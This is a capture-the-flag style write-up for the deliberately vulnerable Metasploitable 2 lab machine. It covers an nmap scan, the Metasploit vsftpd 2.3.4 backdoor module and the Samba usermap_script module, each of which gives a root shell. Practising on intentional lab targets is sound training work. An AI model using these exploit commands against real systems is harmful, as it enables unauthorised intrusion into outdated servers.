# 💣 Metasploitable 2 - Writeup
| Machine | Metasploitable 2 |
|---|---|
| Platform | VulnHub |
| Difficulty | Easy |
| OS | Linux |

## 🎯 Objective

Exploit vulnerabilities and gain root access.

---

## 🔍 Reconnaissance

### Nmap Scan

```bash
nmap -sV <TARGET_IP>
```

### Open Ports:

* 21 → FTP
* 22 → SSH
* 23 → Telnet
* 80 → HTTP
* 445 → SMB

---

## 💥 Exploitation (Metasploit)

Started Metasploit:

```bash
msfconsole
```

---

### 🔓 Exploit: vsftpd Backdoor

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <TARGET_IP>
run
```

➡️ Got shell access

---

### 🧬 Exploit: Samba

```bash
use exploit/multi/samba/usermap_script
set RHOST <TARGET_IP>
run
```

➡️ Meterpreter session opened

---

## 👑 Privilege Escalation

```bash
getuid
```

Already running as root 🎉

---

## 🧠 Lessons Learned

* Outdated services = easy targets
* Metasploit simplifies exploitation
* Enumeration is key

---

## ⚠️ Disclaimer

This machine is intentionally vulnerable for practice. Do not use these techniques on real targets.
